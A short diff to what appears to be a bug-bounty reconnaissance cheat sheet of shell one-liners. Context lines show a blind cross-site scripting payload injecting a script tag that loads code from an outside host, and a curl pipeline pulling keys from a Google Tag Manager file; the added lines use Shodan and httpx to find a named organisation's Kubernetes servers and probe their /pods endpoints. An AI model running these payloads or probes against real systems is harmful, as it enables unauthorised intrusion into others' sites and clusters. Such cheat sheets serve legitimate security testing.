@@ -348,3 +348,12 @@ findomain -t TARGET.COM | gau | bxss -payload '"><script src=https://chirag.bxss
 ```
 curl -s "https://www.googletagmanager.com/gtm.js?id=[TARGET-GTM-ID]" | grep -oP '"key","[a-zA-Z0-9.-]+\.[a-z]{2,}"' | awk -F'"' '{print $4}'
 ```
+
+────────────────────────────────────────────────────────────────────────
+
+# Search for Kubernetes setups in a specific organization and probe them for additional info.
+
+## OneLiner
+```
+shodan search org:"google" product:"Kubernetes" | awk '{print $3}' | httpx -path /pods -content-length -status-code -title
+```
